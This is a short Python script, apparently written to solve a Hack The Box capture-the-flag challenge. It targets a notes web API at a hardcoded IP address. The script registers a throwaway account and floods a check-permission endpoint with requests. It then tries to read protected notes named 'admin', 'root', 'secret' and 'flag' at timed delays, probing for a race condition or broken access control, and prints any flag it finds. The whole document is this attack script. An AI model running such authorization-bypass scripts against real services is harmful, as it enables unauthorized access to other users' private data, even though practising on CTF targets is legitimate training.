#!/usr/bin/env python3
import requests
import time

BASE_URL = "http://83.136.255.203:47148"

email = f"spam{int(time.time()*1000000)}@test.com"
r = requests.post(f"{BASE_URL}/api/auth/register", json={"email": email, "password": "test123"})
TOKEN = r.json()['token']
headers = {"Authorization": f"Bearer {TOKEN}"}

my_note = requests.get(f"{BASE_URL}/api/notes", headers=headers).json()['notes'][0]['id']

print(f"[*] User: {email}")
print(f"[*] My note: {my_note}")

protected = ["admin", "root", "system", "secret", "htb", "flag"]

print("\n[*] Spamming check-permission then trying protected notes...")

for target in protected:
    print(f"\n[*] Target: {target}")
    
    # Spam check-permission 10 times rapidly
    for _ in range(10):
        requests.get(f"{BASE_URL}/api/notes/{my_note}/check-permission", headers=headers)
    
    # Then try to access the protected note
    for delay_ms in [0, 10, 50, 100]:
        if delay_ms > 0:
            time.sleep(delay_ms / 1000.0)
        
        r = requests.get(f"{BASE_URL}/api/notes/{target}", headers=headers)
        result = r.json()
        
        if result.get('success'):
            content = result.get('note', {}).get('content', '')
            print(f"  [+] {delay_ms}ms: {content}")
            
            if 'HTB{' in content:
                print(f"\n[!!!] FLAG: {content}")
                exit(0)
            break

print("\n[*] No flag")
